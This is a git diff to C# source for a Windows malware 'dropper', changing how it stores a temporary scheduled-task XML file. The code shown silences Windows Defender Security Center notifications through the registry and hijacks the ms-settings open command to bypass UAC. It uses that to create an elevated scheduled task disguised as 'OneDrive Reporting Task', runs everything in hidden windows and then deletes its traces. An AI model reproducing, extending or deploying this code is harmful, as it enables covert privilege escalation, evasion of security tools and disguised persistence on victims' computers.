@@ -1,5 +1,4 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using Microsoft.Win32;
@@ -17,10 +16,10 @@ namespace dropper
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
-            string ppath = $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Microsoft\\OneDrive";
             Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);
 
-            File.WriteAllText($"{ppath}\\temp.xml",
+            string xmlpath = Path.GetTempFileName();
+            File.WriteAllText(xmlpath,
 @"<?xml version=""1.0"" encoding=""UTF-16""?>
 <Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
   <Triggers>
@@ -65,7 +64,7 @@ namespace dropper
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "cmd.exe",
-                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn \""OneDrive Reporting Task\"" /xml " + $"{ppath}\\temp.xml" + @""" /t REG_SZ /f",
+                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn \""OneDrive Reporting Task\"" /xml " + xmlpath + @""" /t REG_SZ /f",
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
@@ -84,7 +83,7 @@ namespace dropper
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
-            File.Delete($"{ppath}\\temp.xml");
+            File.Delete(xmlpath);
             Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", true).DeleteValue("Enabled");
             Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
         }
